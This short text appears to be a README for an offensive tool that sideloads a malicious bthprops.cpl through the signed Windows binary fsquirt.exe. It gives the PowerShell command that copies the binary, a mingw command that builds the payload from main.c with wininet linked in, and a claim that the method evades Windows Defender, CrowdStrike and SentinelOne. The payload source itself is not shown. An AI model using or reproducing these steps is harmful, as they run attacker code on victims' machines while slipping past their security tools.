copy the fsquirt binary to somewhere you can write to, then drop the bthprops.cpl file in the same dir and launch fsquirt

Powershell copy command:
```Copy-Item "C:\Windows\System32\fsquirt.exe" .```

command to compile main.c from kali:
```x86_64-w64-mingw32-gcc -shared -Os -s -o bthprops.cpl main.c -luser32 -lwininet```

Tested working against Windows defender, CrowdStrike, SentinelOne 
